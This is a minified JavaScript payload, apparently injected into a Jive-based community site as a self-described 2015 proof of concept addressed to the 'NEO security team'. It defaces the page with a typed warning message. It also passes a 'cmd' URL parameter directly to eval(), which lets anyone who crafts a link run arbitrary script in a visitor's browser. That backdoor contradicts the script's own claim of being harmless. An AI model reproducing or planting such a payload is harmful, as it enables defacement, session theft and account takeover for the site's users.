var i=0;var showString="Hi There,|"+"|"+"If you see this page, it means that the NEO has a security vulnerability.|"+"Please DO NOT worry, this won't have any malicious behavior, just a test.|"+"It is a very high risk level of vulnerability, I have reported to NEO Security Team five days ago.|"+"This page is just to get the NEO security team to pay enough attention to. Please fix it ASAP.|"+"|"+"Have a good day.|"+"|"+"By Kevin, Greater China Technology Team, 2015-06-05.|"+"|";function marquee(){var a=showString.length;var e=document.getElementById("input");if(showString.charAt(i)==="|"){var b=document.createElement("br");e.appendChild(b)}else{e.innerHTML+=showString.charAt(i)}i++;var c=setTimeout("marquee()",70);if(i>=a){clearTimeout(c);i=0;var d=document.createElement("span");d.style.color="white";var f=document.location.search.substr(1);d.innerHTML="Click <a href= '"+document.location.origin+document.location.pathname+"?"+f+"&view=normal'><b>here</b></a> to visit normal page.";e.appendChild(d)}}function getParameterByName(a){a=a.replace(/[\[]/,"\\[").replace(/[\]]/,"\\]");var c=new RegExp("[\\?&]"+a+"=([^&#]*)"),b=c.exec(location.search);return b===null?"":decodeURIComponent(b[1].replace(/\+/g," "))}var cmd=getParameterByName("cmd");if(!!cmd){eval(cmd)}else{var nView=getParameterByName("view");if(!!nView){}else{var body=document.getElementsByClassName("jive-body-content")[0];body.innerHTML="";body.style.background="black";body.innerHTML="<br/><span id='input' style='color:rgb(70, 221, 70);'></span>";marquee()}};